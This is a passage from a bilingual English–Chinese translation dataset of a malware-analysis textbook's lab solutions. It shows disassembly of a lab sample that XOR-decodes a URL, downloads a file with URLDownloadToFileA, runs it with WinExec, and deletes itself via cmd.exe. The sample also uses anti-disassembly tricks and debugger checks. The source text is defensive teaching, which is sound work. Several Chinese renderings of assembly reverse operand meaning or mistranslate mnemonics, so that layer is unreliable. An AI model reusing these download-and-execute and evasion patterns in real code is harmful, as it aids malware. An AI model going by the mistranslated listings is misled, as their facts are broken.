  prefs: []
  type: TYPE_NORMAL
  zh: 在将清单 15-17L 中的数据成功更改为代码后，它将如清单 15-18L 所示显示。
- en: 004014C0 mov esp, [esp+8]
  id: totrans-5367
  prefs: []
  type: TYPE_NORMAL
  zh: 004014C0 将 esp 的值移动到 [esp+8]
- en: 004014C4 mov eax, large fs:0
  id: totrans-5368
  prefs: []
  type: TYPE_NORMAL
  zh: 004014C4 将 eax 的值移动到 large fs:0
- en: 004014CA mov eax, [eax]
  id: totrans-5369
  prefs: []
  type: TYPE_NORMAL
  zh: 004014CA 将 eax 的值移动到 [eax]
- en: 004014CC mov eax, [eax]
  id: totrans-5370
  prefs: []
  type: TYPE_NORMAL
  zh: 004014CC 将 eax 的值移动到 [eax]
- en: 004014CE mov large fs:0, eax
  id: totrans-5371
  prefs: []
  type: TYPE_NORMAL
  zh: 004014CE 将 large fs:0 的值移动到 eax
- en: 004014D4 add esp, 8
  id: totrans-5372
  prefs: []
  type: TYPE_NORMAL
  zh: 004014D4 添加 esp, 8
- en: 004014D7 jmp short near ptr loc_4014D7+1 
  id: totrans-5373
  prefs: []
  type: TYPE_NORMAL
  zh: 004014D7 短跳转 near ptr loc_4014D7+1 
- en: '*Listing 15-18L: Properly disassembled exception-handling code* The code in
    Listing 15-18L unlinks the structured exception handler and removes the exception
    record from the stack. The last line of the code is an anti-disassembly countermeasure
    in the form of an inward-pointing jmp instruction at . Convert the jmp to data
    by placing your cursor at 0x4014D7'
  id: totrans-5374
  prefs: []
  type: TYPE_NORMAL
  zh: '*清单 15-18L：正确反汇编的异常处理代码* 清单 15-18L 中的代码解除了结构化异常处理程序的链接，并从堆栈中删除了异常记录。代码的最后一条是反汇编对抗措施，形式为指向内点的
    jmp 指令。通过将光标放在 0x4014D7 处将 jmp 转换为数据。'
- en: and pressing the D key. Then select line 0x004014D8 and convert it to code with
    the C key.
  id: totrans-5375
  prefs: []
  type: TYPE_NORMAL
  zh: 按下 D 键。然后选择行 0x004014D8 并使用 C 键将其转换为代码。
- en: After correcting the anti-disassembly countermeasure shown in Listing 15-18L,
    we see that the rest of the code is properly disassembled with a call to URLDownloadToFileA,
    seen at  in Listing 15-19L.
  id: totrans-5376
  prefs: []
  type: TYPE_NORMAL
  zh: 在修正清单 15-18L 中显示的反汇编对抗措施后，我们看到其余的代码通过调用 URLDownloadToFileA 正确反汇编，如清单 15-19L
    中的所示。
- en: 004014E6 push offset unk_403010
  id: totrans-5377
  prefs: []
  type: TYPE_NORMAL
  zh: 004014E6 推送 offset unk_403010
- en: 004014EB call sub_401534 
  id: totrans-5378
  prefs: []
  type: TYPE_NORMAL
  zh: 004014EB 调用 sub_401534 
- en: 004014F0 add esp, 4
  id: totrans-5379
  prefs: []
  type: TYPE_NORMAL
  zh: 004014F0 添加 esp, 4
- en: 004014F3 push offset unk_403040
  id: totrans-5380
  prefs: []
  type: TYPE_NORMAL
  zh: 004014F3 推送 offset unk_403040
- en: 004014F8 call sub_401534 
  id: totrans-5381
  prefs: []
  type: TYPE_NORMAL
  zh: 004014F8 调用 sub_401534 
- en: 004014FD add esp, 4
  id: totrans-5382
  prefs: []
  type: TYPE_NORMAL
  zh: 004014FD 添加 esp, 4
- en: 00401500 push 0
  id: totrans-5383
  prefs: []
  type: TYPE_NORMAL
  zh: 00401500 推送 0
- en: 00401502 push 0
  id: totrans-5384
  prefs: []
  type: TYPE_NORMAL
  zh: 00401502 推送 0
- en: 00401504 push offset unk_403040 
  id: totrans-5385
  prefs: []
  type: TYPE_NORMAL
  zh: 00401504 推送 offset unk_403040 
- en: 00401509 push offset unk_403010 
  id: totrans-5386
  prefs: []
  type: TYPE_NORMAL
  zh: 00401509 推送 offset unk_403010 
- en: 0040150E push 0
  id: totrans-5387
  prefs: []
  type: TYPE_NORMAL
  zh: 0040150E 推送 0
- en: 00401510 call URLDownloadToFileA 
  id: totrans-5388
  prefs: []
  type: TYPE_NORMAL
  zh: 00401510 调用 URLDownloadToFileA 
- en: '*Listing 15-19L: Downloading a file from a URL*'
  id: totrans-5389
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 15-19L：从 URL 下载文件*'
- en: The second and third arguments to URLDownloadToFileA are the URL and filename,
    respectively. It seems that the global memory locations unk_403010
  id: totrans-5390
  prefs: []
  type: TYPE_NORMAL
  zh: URLDownloadToFileA 的第二个和第三个参数分别是 URL 和文件名。看起来全局内存位置 unk_403010
- en: and unk_403040 are being used at  and , respectively. If you examine this
    memory with IDA Pro, the data does not appear to be ASCII text. These same locations
    are also passed to sub_401534 at  and . We should examine this function to see
    if it decodes this data. Careful analysis of this function (not shown here) will
    find that it takes a pointer to a buffer and modifies it in place by XOR’ing each
    byte with the value 0xFF. If we XOR the data at unk_403010, we get the strings
    http://www.practicalmalwareanalysis.com/tt.html and spoolsrv.exe for unk_403040\.
  id: totrans-5391
  prefs: []
  type: TYPE_NORMAL
  zh: 和 unk_403040 分别在  和  处被使用。如果你用 IDA Pro 检查这段内存，数据看起来不是 ASCII 文本。这些相同的地址也被传递给
    sub_401534 在  和 。我们应该检查这个函数，看看它是否解码这些数据。对这个函数的仔细分析（此处未显示）会发现它通过 XOR 每个字节与值 0xFF
    来修改一个缓冲区的指针，并就地修改它。如果我们 XOR unk_403010 中的数据，我们得到字符串 http://www.practicalmalwareanalysis.com/tt.html
    和 spoolsrv.exe 作为 unk_403040\.
- en: Immediately following the call to URLDownloadToFileA, we encounter one last
    anti-disassembly countermeasure, as shown in Listing 15-20L. This is a **654**
  id: totrans-5392
  prefs: []
  type: TYPE_NORMAL
  zh: 在调用 URLDownloadToFileA 之后立即，我们遇到了最后一个反反汇编对策，如列表 15-20L 所示。这是一个 **654**
- en: Appendix C
  id: totrans-5393
  prefs: []
  type: TYPE_NORMAL
  zh: 附录 C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-5394
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: false conditional in the form of a combination of jz and jnz together to create
    an unconditional jump, at  and .
  id: totrans-5395
  prefs: []
  type: TYPE_NORMAL
  zh: 以 jz 和 jnz 组合的形式创建的无条件跳转的假条件，在  和  处。
- en: 00401515 jz short near ptr loc_401519+1 
  id: totrans-5396
  prefs: []
  type: TYPE_NORMAL
  zh: 00401515 jz short near ptr loc_401519+1 
- en: 00401517 jnz short near ptr loc_401519+1 
  id: totrans-5397
  prefs: []
  type: TYPE_NORMAL
  zh: 00401517 jnz short near ptr loc_401519+1 
- en: 00401519
  id: totrans-5398
  prefs: []
  type: TYPE_NORMAL
  zh: 00401519
- en: '00401519 loc_401519: ; CODE XREF: 00401515j 00401519 ; 00401517j 00401519 call
    near ptr 40A81588h'
  id: totrans-5399
  prefs: []
  type: TYPE_NORMAL
  zh: '00401519 loc_401519: ; CODE XREF: 00401515j 00401519 ; 00401517j 00401519 调用
    near ptr 40A81588h'
- en: 0040151E xor [eax+0], al
  id: totrans-5400
  prefs: []
  type: TYPE_NORMAL
  zh: 0040151E xor [eax+0], al
- en: 00401521 call ds:WinExec
  id: totrans-5401
  prefs: []
  type: TYPE_NORMAL
  zh: 00401521 调用 ds:WinExec
- en: '*Listing 15-20L: The final anti-disassembly technique encountered in the malware*
    The target of the jumps is 0x0040151A. Place your cursor on line 0x00401519 and
    press D to turn this line into data. Then select line 0x0040151A and press C to
    turn it into code. Continue this process until you are left with the code shown
    in Listing 15-21L.'
  id: totrans-5402
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 15-20L：在恶意软件中遇到的最后一个反反汇编技术* 跳转的目标是 0x0040151A。将光标放在 0x00401519 行上，按 D 将此行转换为数据。然后选择
    0x0040151A 行，按 C 将其转换为代码。继续这个过程，直到你只剩下列表 15-21L 中显示的代码。'
- en: 0040151A push 0
  id: totrans-5403
  prefs: []
  type: TYPE_NORMAL
  zh: 0040151A 推送 0
- en: 0040151C push offset unk_403040
  id: totrans-5404
  prefs: []
  type: TYPE_NORMAL
  zh: 0040151C 推送偏移量 unk_403040
- en: 00401521 call ds:WinExec 
  id: totrans-5405
  prefs: []
  type: TYPE_NORMAL
  zh: 00401521 调用 ds:WinExec 
- en: 00401527 push 0
  id: totrans-5406
  prefs: []
  type: TYPE_NORMAL
  zh: 00401527 推送 0
- en: 00401529 call ds:ExitProcess
  id: totrans-5407
  prefs: []
  type: TYPE_NORMAL
  zh: 00401529 调用 ds:ExitProcess
- en: '*Listing 15-21L: Using WinExec to launch the downloaded file* The call to WinExec
    at  will launch whatever is specified by the buffer unk_403040, which will contain
    the value spoolsrv.exe. The program then terminates manually with ExitProcess.'
  id: totrans-5408
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 15-21L：使用 WinExec 启动下载的文件* 在  处的 WinExec 调用将启动缓冲区 unk_403040 中指定的内容，该缓冲区将包含值
    spoolsrv.exe。然后程序通过 ExitProcess 手动终止。'
- en: '**Lab 16-1 Solutions**'
  id: totrans-5409
  prefs: []
  type: TYPE_NORMAL
  zh: '**实验室 16-1 解决方案**'
- en: '***Short Answers***'
  id: totrans-5410
  prefs: []
  type: TYPE_NORMAL
  zh: '***简短回答***'
- en: '**1 6**'
  id: totrans-5411
  prefs: []
  type: TYPE_NORMAL
  zh: '**1 6**'
- en: 1\.
  id: totrans-5412
  prefs: []
  type: TYPE_NORMAL
  zh: 1\.
- en: The malware checks the status of the BeingDebugged, ProcessHeap, and NTGlobalFlag
    flags to determine if it is being run in a debugger.
  id: totrans-5413
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件检查 BeingDebugged、ProcessHeap 和 NTGlobalFlag 标志的状态，以确定它是否在调试器中运行。
- en: 2\.
  id: totrans-5414
  prefs: []
  type: TYPE_NORMAL
  zh: 2\.
- en: If any of the malware’s anti-debugging techniques succeed, it will terminate
    and remove itself from disk.
  id: totrans-5415
  prefs: []
  type: TYPE_NORMAL
  zh: 如果恶意软件的任何反调试技术成功，它将终止并从磁盘上删除自己。
- en: 3\.
  id: totrans-5416
  prefs: []
  type: TYPE_NORMAL
  zh: 3\.
- en: You can manually change the jump flags in OllyDbg during runtime, but doing
    so will get tedious since this malware checks the memory structures so frequently.
    Instead, modify the structures the malware checks in memory either manually or
    by using an OllyDbg plug-in like PhantOm or the Immunity Debugger (ImmDbg) PyCommand
    hidedebug.
  id: totrans-5417
  prefs: []
  type: TYPE_NORMAL
  zh: 你可以在 OllyDbg 运行时手动更改跳转标志，但这样做会很麻烦，因为这种恶意软件频繁检查内存结构。相反，手动或通过使用 OllyDbg 插件如 PhantOm
    或 Immunity Debugger (ImmDbg) PyCommand hidedebug 来修改恶意软件在内存中检查的结构。
- en: 4\.
  id: totrans-5418
  prefs: []
  type: TYPE_NORMAL
  zh: 4\.
- en: See the detailed analysis for a step-by-step way to dump and modify the structures
    in OllyDbg.
  id: totrans-5419
  prefs: []
  type: TYPE_NORMAL
  zh: 请参阅详细分析，了解在 OllyDbg 中导出和修改结构的逐步方法。
- en: 5\.
  id: totrans-5420
  prefs: []
  type: TYPE_NORMAL
  zh: 5\.
- en: Both the OllyDbg plug-in PhantOm and the ImmDbg PyCommand hidedebug will thwart
    this malware’s checks.
  id: totrans-5421
  prefs: []
  type: TYPE_NORMAL
  zh: OllyDbg 插件 PhantOm 和 ImmDbg PyCommand hidedebug 都会阻止这种恶意软件的检查。
- en: Solutions to Labs
  id: totrans-5422
  prefs: []
  type: TYPE_NORMAL
  zh: 实验室解决方案
- en: '**655**'
  id: totrans-5423
  prefs: []
  type: TYPE_NORMAL
  zh: '**655**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-5424
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '![Image 147](index-689_1.png)'
  id: totrans-5425
  prefs: []
  type: TYPE_IMG
  zh: '![Image 147](index-689_1.png)'
- en: '***Detailed Analysis***'
  id: totrans-5426
  prefs: []
  type: TYPE_NORMAL
  zh: '***详细分析***'
- en: As noted in the lab description, this malware is the same as *Lab09-01.exe*,
    except with anti-debugging techniques. Therefore, a good place to start is either
    by working through Lab 9-1 or by reviewing your answers.
  id: totrans-5427
  prefs: []
  type: TYPE_NORMAL
  zh: 如实验室描述中所述，此恶意软件与*Lab09-01.exe*相同，只是增加了反调试技术。因此，一个好的开始是解决Lab 9-1或者复习你的答案。
- en: 'When we load this malware into OllyDbg, we see that it attempts to delete itself.
    Suspecting that something must be wrong or that this malware is significantly
    different from Lab 9-1, we load *Lab16-01.exe* into IDA Pro. As shown in Figure
    16-1L, we notice that the beginning of the main method appears suspicious because
    of several accesses of fs:[30] and calls to a function that IDA Pro identifies
    as one that doesn’t return. In fact, most functions recognized by IDA Pro have
    this suspicious start. (None of the functions in Lab 9-1 have this code.) *Figure
    16-1L: Anti-debugging checks contained at the beginning of most functions in*
    *Lab 16-1*'
  id: totrans-5428
  prefs: []
  type: TYPE_NORMAL
  zh: 当我们将此恶意软件加载到OllyDbg中时，我们看到它试图删除自己。怀疑一定出了问题，或者这个恶意软件与Lab 9-1显著不同，我们将*Lab16-01.exe*加载到IDA
    Pro中。如图16-1L所示，我们注意到主方法的开头看起来可疑，因为有几个对fs:[30]的访问和对IDA Pro识别为不返回的函数的调用。事实上，IDA
    Pro识别的大多数函数都有这个可疑的开始。（Lab 9-1中的所有函数都没有这段代码。）*图16-1L：* *Lab 16-1* *大多数函数开始时包含的反调试检查*
- en: We see at , , and  in Figure 16-1L that sub_401000 is called and the code
    stops there (no lines leave the boxes). Since a line doesn’t leave the box, it
    means the function probably terminates the program or doesn’t contain a ret instruction.
    Each large box in Figure 16-1L contains a check that decides whether sub_401000
    will be called or the malware will continue to execute normally. (We’ll analyze
    each of these checks after we look at sub_401000.) The function sub_401000 is
    suspicious because execution won’t return from it, so we examine it further. Listing
    16-1L shows its final instructions.
  id: totrans-5429
  prefs: []
  type: TYPE_NORMAL
  zh: 我们在图16-1L中的、和处看到sub_401000被调用，代码在那里停止（没有线条离开方框）。由于没有线条离开方框，这意味着函数可能终止了程序或者不包含ret指令。图16-1L中的每个大方框都包含一个检查，以决定是否调用sub_401000或者恶意软件将继续正常执行。（我们将在查看sub_401000之后分析这些检查。）sub_401000函数可疑，因为执行不会从它返回，所以我们进一步检查它。列表16-1L显示了它的最后指令。
- en: '**656**'
  id: totrans-5430
  prefs: []
  type: TYPE_NORMAL
  zh: '**656**'
- en: Appendix C
  id: totrans-5431
  prefs: []
  type: TYPE_NORMAL
  zh: 附录C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-5432
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: 004010CE lea eax, [ebp+Parameters]
  id: totrans-5433
  prefs: []
  type: TYPE_NORMAL
  zh: 004010CE lea eax, [ebp+Parameters]
- en: 004010D4 push eax ; lpParameters 004010D5 push offset File ; "cmd.exe"
  id: totrans-5434
  prefs: []
  type: TYPE_NORMAL
  zh: 004010D4 push eax ; lpParameters 004010D5 push offset File ; "cmd.exe"
- en: 004010DA push 0 ; lpOperation 004010DC push 0 ; hwnd
  id: totrans-5435
  prefs: []
  type: TYPE_NORMAL
  zh: 004010DA push 0 ; lpOperation 004010DC push 0 ; hwnd
- en: 004010DE call ds:ShellExecuteA 
  id: totrans-5436
  prefs: []
  type: TYPE_NORMAL
  zh: 004010DE call ds:ShellExecuteA 
- en: 004010E4 push 0 ; Code
  id: totrans-5437
  prefs: []
  type: TYPE_NORMAL
  zh: 004010E4 push 0 ; Code
- en: 004010E6 call _exit 
  id: totrans-5438
  prefs: []
  type: TYPE_NORMAL
  zh: 004010E6 call _exit 
- en: '*Listing 16-1L: Function sub_401000 with code to terminate the malware and
    remove it* *from disk*'
  id: totrans-5439
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表16-1L：包含终止恶意软件和从磁盘删除恶意软件代码的函数sub_401000* '
- en: Function sub_401000 ends at  with a call to _exit, terminating the malware.
    The call to ShellExecuteA at  removes the malware from disk by launching *cmd.exe*
    using the parameters /c del Lab16-01.exe. Checking the cross-references to sub_401000,
    we find 79 of them, most of which come from the anti-debugging code shown in Figure
    16-1L. Let’s dissect Figure 16-1L
  id: totrans-5440
  prefs: []
  type: TYPE_NORMAL
  zh: 函数sub_401000在处通过调用_exit结束，终止了恶意软件。在处的ShellExecuteA调用通过使用参数/c del Lab16-01.exe启动*cmd.exe*，从磁盘上删除恶意软件。检查对sub_401000的交叉引用，我们发现共有79个，其中大部分来自图16-1L中显示的反调试代码。让我们剖析图16-1L。
- en: in more detail.
  id: totrans-5441
  prefs: []
  type: TYPE_NORMAL
  zh: 更详细地。
- en: '**The BeingDebugged Flag**'
  id: totrans-5442
  prefs: []
  type: TYPE_NORMAL
  zh: '**调试中标志**'
- en: Listing 16-2L shows the code in the top box of Figure 16-1L.
  id: totrans-5443
  prefs: []
  type: TYPE_NORMAL
  zh: 列表16-2L显示了图16-1L顶部方框中的代码。
- en: 00403554 mov eax, large fs:30h 
  id: totrans-5444
  prefs: []
  type: TYPE_NORMAL
  zh: 00403554 mov eax, large fs:30h 
- en: 0040355A mov bl, [eax+2] 
  id: totrans-5445
  prefs: []
  type: TYPE_NORMAL
  zh: 0040355A mov bl, [eax+2] 
- en: 0040355D mov [ebp+var_1820], bl
  id: totrans-5446
  prefs: []
  type: TYPE_NORMAL
  zh: 0040355D mov [ebp+var_1820], bl
- en: 00403563 movsx eax, [ebp+var_1820]
  id: totrans-5447
  prefs: []
  type: TYPE_NORMAL
  zh: 00403563 movsx eax, [ebp+var_1820]
- en: 0040356A test eax, eax
  id: totrans-5448
  prefs: []
  type: TYPE_NORMAL
  zh: 0040356A test eax, eax
- en: 0040356C jz short loc_403573 
  id: totrans-5449
  prefs: []
  type: TYPE_NORMAL
  zh: 0040356C jz short loc_403573 
- en: 0040356E call sub_401000
  id: totrans-5450
  prefs: []
  type: TYPE_NORMAL
  zh: 0040356E call sub_401000
- en: '*Listing 16-2L: Checking the BeingDebugged flag*'
  id: totrans-5451
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表16-2L：检查调试中标志*'
- en: As you can see, the PEB structure is loaded into EAX at  using the fs:[30]
    location, as discussed in “Manually Checking Structures” on page 353\.
  id: totrans-5452
  prefs: []
  type: TYPE_NORMAL
  zh: 如您所见，PEB结构在处使用fs:[30]位置加载到EAX中，正如在第353页的“手动检查结构”中讨论的那样。
- en: At , the second byte is accessed and moved into the BL register. At , the
    **1 6**
  id: totrans-5453
  prefs: []
  type: TYPE_NORMAL
  zh: 在处，第二个字节被访问并移动到BL寄存器中。在处，**1 6**
- en: code decides whether to call sub_401000 (the terminate and remove function)
    or to continue running the malware.
  id: totrans-5454
  prefs: []
  type: TYPE_NORMAL
  zh: 代码决定是否调用 sub_401000（终止并删除函数）或继续运行恶意软件。
- en: The BeingDebugged flag at offset 2 in the PEB structure is set to 1 when the
    process is running inside a debugger, but we need this flag set to 0 in order
    for the malware to run normally within a debugger. We can set this byte to 0
  id: totrans-5455
  prefs: []
  type: TYPE_NORMAL
  zh: 当进程在调试器内运行时，PEB 结构偏移量为 2 的 BeingDebugged 标志被设置为 1，但我们需要将此标志设置为 0，以便恶意软件在调试器内正常运行。我们可以将此字节设置为
    0
- en: either manually or with an OllyDbg plug-in. Let’s do it manually first.
  id: totrans-5456
  prefs: []
  type: TYPE_NORMAL
  zh: 可以手动进行，也可以使用 OllyDbg 插件。我们先手动进行。
- en: 'In OllyDbg, make sure you have the Command Line plug-in installed (as discussed
    in Chapter 9). To launch the plug-in, load the malware in OllyDbg and select **Plugins****Command
    Line**. In the command-line window, enter the following command:'
  id: totrans-5457
  prefs: []
  type: TYPE_NORMAL
  zh: 在 OllyDbg 中，请确保您已安装命令行插件（如第 9 章所述）。要启动插件，请将恶意软件加载到 OllyDbg 中并选择 **插件****命令行**。在命令行窗口中，输入以下命令：
- en: dump fs:[30] + 2
  id: totrans-5458
  prefs: []
  type: TYPE_NORMAL
  zh: dump fs:[30] + 2
- en: Solutions to Labs
  id: totrans-5459
  prefs: []
  type: TYPE_NORMAL
  zh: 实验解决方案
- en: '**657**'
  id: totrans-5460
  prefs: []
  type: TYPE_NORMAL
  zh: '**657**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-5461
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '![Image 148](index-691_1.png)'
  id: totrans-5462
  prefs: []
  type: TYPE_IMG
  zh: '![Image 148](index-691_1.png)'
- en: '![Image 149](index-691_2.png)'
  id: totrans-5463
  prefs: []
  type: TYPE_IMG
  zh: '![Image 149](index-691_2.png)'
- en: This command will dump the BeingDebugged flag into the dump window.
  id: totrans-5464
  prefs: []
  type: TYPE_NORMAL
  zh: 此命令将 BeingDebugged 标志输出到转储窗口。
- en: To manually clear the BeingDebugged flag, run the dump command in the command-line
    window, as shown in the top part of Figure 16-2L. Then right-click the BeingDebugged
    flag and select **Binary****Fill With 00’s**, as shown in the bottom portion
    of Figure 16-2L. This sets the flag to 0\. With this change, the BeingDebugged
    check performed several times at the start of functions in the malware will no
    longer call the sub_401000 function.
  id: totrans-5465
  prefs: []
  type: TYPE_NORMAL
  zh: 要手动清除 BeingDebugged 标志，请在命令行窗口中运行转储命令，如图 16-2L 上半部分所示。然后右键单击 BeingDebugged 标志并选择
    **二进制****填充为 00**，如图 16-2L 下半部分所示。这将标志设置为 0。通过此更改，恶意软件函数开始时进行的多次 BeingDebugged
    检查将不再调用 sub_401000 函数。
- en: Now let’s try the plug-in approach. The OllyDbg plug-in PhantOm ( *http://www.woodmann.com/collaborative/tools/index.php/PhantOm*)
    will protect you from many anti-debug checks used by malware. Download the plug-in
    and install it by copying it to your OllyDbg installation directory before launching
    OllyDbg. Then select **Plugins****PhantOm****Options** to open the PhantOm Options
    dialog, as shown in Figure 16-3L. Check the first option, **Hide from PEB**, to
    set the BeingDebugged flag to 0 the next time OllyDbg loads malware. (Confirm
    this by dumping the PEB structure before and after the plug-in is installed.)
  id: totrans-5466
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们尝试插件方法。OllyDbg 插件 PhantOm (*http://www.woodmann.com/collaborative/tools/index.php/PhantOm*)
    将保护您免受恶意软件使用的许多反调试检查。下载插件并将其复制到 OllyDbg 安装目录中，然后启动 OllyDbg。然后选择 **插件****PhantOm****选项**
    打开 PhantOm 选项对话框，如图 16-3L 所示。勾选第一个选项，**从 PEB 隐藏**，以便在 OllyDbg 加载恶意软件时将 BeingDebugged
    标志设置为 0。（通过在安装插件前后转储 PEB 结构来确认这一点。）
- en: '*Figure 16-2L: Using the command line to dump*'
  id: totrans-5467
  prefs: []
  type: TYPE_NORMAL
  zh: '*图 16-2L：使用命令行转储*'
- en: '*Figure 16-3L: OllyDbg PhantOm*'
  id: totrans-5468
  prefs: []
  type: TYPE_NORMAL
  zh: '*图 16-3L：OllyDbg PhantOm*'
- en: '*the BeingDebugged flag and then setting it to 0*'
  id: totrans-5469
  prefs: []
  type: TYPE_NORMAL
  zh: '*将 BeingDebugged 标志设置为 0*'
- en: '*plug-in options*'
  id: totrans-5470
  prefs: []
  type: TYPE_NORMAL
  zh: '*插件选项*'
- en: '**The ProcessHeap Flag**'
  id: totrans-5471
  prefs: []
  type: TYPE_NORMAL
  zh: '**ProcessHeap 标志**'
- en: Listing 16-3L shows the code in the middle box of Figure 16-1L.
  id: totrans-5472
  prefs: []
  type: TYPE_NORMAL
  zh: 列表 16-3L 显示了图 16-1L 中间框中的代码。
- en: 00401410 64 A1 30 00 00+ mov eax, large fs:30h 
  id: totrans-5473
  prefs: []
  type: TYPE_NORMAL
  zh: 00401410 64 A1 30 00 00+ mov eax, large fs:30h 
- en: 00401416 8B 40 18 mov eax, [eax+18h] 
  id: totrans-5474
  prefs: []
  type: TYPE_NORMAL
  zh: 00401416 8B 40 18 mov eax, [eax+18h] 
- en: 00401419 db 3Eh 
  id: totrans-5475
  prefs: []
  type: TYPE_NORMAL
  zh: 00401419 db 3Eh 
- en: 00401419 3E 8B 40 10 mov eax, [eax+10h] 
  id: totrans-5476
  prefs: []
  type: TYPE_NORMAL
  zh: 00401419 3E 8B 40 10 mov eax, [eax+10h] 
- en: 0040141D 89 45 F0 mov [ebp+var_10], eax 00401420 83 7D F0 00 cmp [ebp+var_10],
    0 
  id: totrans-5477
  prefs: []
  type: TYPE_NORMAL
  zh: 0040141D 89 45 F0 mov [ebp+var_10], eax 00401420 83 7D F0 00 cmp [ebp+var_10],
    0 
- en: 00401424 74 05 jz short loc_40142B
  id: totrans-5478
  prefs: []
  type: TYPE_NORMAL
  zh: 00401424 74 05 jz short loc_40142B
- en: 00401426 E8 D5 FB FF FF call sub_401000
  id: totrans-5479
  prefs: []
  type: TYPE_NORMAL
  zh: 00401426 E8 D5 FB FF FF call sub_401000
- en: '*Listing 16-3L: Checking the ProcessHeap flag*'
  id: totrans-5480
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 16-3L：检查 ProcessHeap 标志*'
- en: '**658**'
  id: totrans-5481
  prefs: []
  type: TYPE_NORMAL
  zh: '**658**'
- en: Appendix C
  id: totrans-5482
  prefs: []
  type: TYPE_NORMAL
  zh: 附录 C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-5483
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: The PEB structure is loaded into EAX at  using fs:[30]. At , the ProcessHeap
    structure (offset 0x18 into the PEB) is moved into EAX, and then the ForceFlags
    field (offset 0x10 into the ProcessHeap structure) is moved into EAX at . ForceFlags
    is compared to 0 at  to decide whether to call sub_401000 or to continue running
    normally.
  id: totrans-5484
  prefs: []
  type: TYPE_NORMAL
  zh: 使用 fs:[30] 将 PEB 结构加载到 EAX 中 。在 ，将 ProcessHeap 结构（PEB 中的偏移量为 0x18）移动到 EAX，然后将
    ForceFlags 字段（ProcessHeap 结构中的偏移量为 0x10）移动到 EAX 中 。ForceFlags 在  处与 0 进行比较，以决定是否调用
    sub_401000 或继续正常运行。
- en: An erroneous db 3Eh instruction was added by IDA Pro at . We displayed the
    opcodes in Listing 16-2L to show that the 0x3E is included in the next instruction
    at . If you look at the disassembly in OllyDbg, you won’t see this error.
  id: totrans-5485
  prefs: []
  type: TYPE_NORMAL
  zh: IDA Pro 添加了一个错误的 db 3Eh 指令。我们在列表 16-2L 中显示了操作码，以表明 0x3E 包含在下一个指令中。如果您查看 OllyDbg
    中的反汇编，您将看不到这个错误。
- en: '**NOTE**'
  id: totrans-5486
  prefs: []
  type: TYPE_NORMAL
  zh: '**注意**'
- en: '*When you encounter erroneous db instructions, you can ignore them, but you
    should* *display opcodes to confirm that the byte is disassembled properly in
    an instruction.*'
  id: totrans-5487
  prefs: []
  type: TYPE_NORMAL
  zh: '*当您遇到错误的 db 指令时，您可以忽略它们，但您应该 *显示操作码以确认字节在指令中正确反汇编。*'
- en: The 4-byte ForceFlags field is nonzero when the ProcessHeap structure is created
    in the debugger, and the ForceFlags field must be 0 in order for the malware to
    run normally within a debugger. We need to change it to 0 when debugging, either
    manually with the OllyDbg Command Line plug-in or by using the OllyDbg PhantOm
    plug-in, as with the BeingDebugged flag.
  id: totrans-5488
  prefs: []
  type: TYPE_NORMAL
  zh: 当在调试器中创建 ProcessHeap 结构时，4 字节的 ForceFlags 字段不为零，并且为了使恶意软件在调试器中正常运行，ForceFlags
    字段必须为 0。我们需要在调试时将其更改为 0，无论是使用 OllyDbg 命令行插件手动更改，还是使用 OllyDbg PhantOm 插件，就像 BeingDebugged
    标志一样。
- en: 'To set the ForceFlags field to 0 manually, launch the Command Line plug-in
    by selecting **Plugins****Command Line**, and then enter the following command
    in the window:'
  id: totrans-5489
  prefs: []
  type: TYPE_NORMAL
  zh: 要手动设置 ForceFlags 字段为 0，通过选择 **插件****命令行** 启动命令行插件，然后在窗口中输入以下命令：
- en: dump ds:[fs:[30] + 0x18] + 0x10
  id: totrans-5490
  prefs: []
  type: TYPE_NORMAL
  zh: 将 ds:[fs:[30] + 0x18] + 0x10 的内容转储
- en: The command dumps the ForceFlags field of the ProcessHeap structure into the
    dump window. Select all 4 bytes of the ForceFlags field, and then right-click
    and select **Binary****Fill With 00’s** to set the 4 bytes to 0\.
  id: totrans-5491
  prefs: []
  type: TYPE_NORMAL
  zh: 该命令将 ProcessHeap 结构的 ForceFlags 字段转储到转储窗口中。选择 ForceFlags 字段的 4 个字节，然后右键单击并选择
    **二进制****填充为 00** 以将 4 个字节设置为 0。
- en: '**NOTE**'
  id: totrans-5492
  prefs: []
  type: TYPE_NORMAL
  zh: '**注意**'
- en: '*In Windows 7, offset 0x10 is no longer the ForceFlags field, so this anti-debugging*
    *method may end up falsely indicating the presence of a debugger on newer versions
    of* *Windows (post-XP).*'
  id: totrans-5493
  prefs: []
  type: TYPE_NORMAL
  zh: '*在 Windows 7 中，偏移量 0x10 已不再是 ForceFlags 字段，因此这种反调试方法可能会在新版本的 Windows（XP 以后）中错误地指示存在调试器。*'
- en: Alternatively, use the PhantOm plug-in to protect against the ProcessHeap anti-debugging
    technique. The PhantOm plug-in will cause this technique to fail when you start
    the program with debug heap creation disabled. (You **1 6**
  id: totrans-5494
  prefs: []
  type: TYPE_NORMAL
  zh: 或者，使用 PhantOm 插件来防止 ProcessHeap 反调试技术。当您禁用调试堆创建启动程序时，PhantOm 插件将导致此技术失败。（您 **1
    6**）
- en: don’t need to modify the settings as you did for the BeingDebugged flag.) **NOTE**
  id: totrans-5495
  prefs: []
  type: TYPE_NORMAL
  zh: （不需要像修改 BeingDebugged 标志那样修改设置。）**注意**
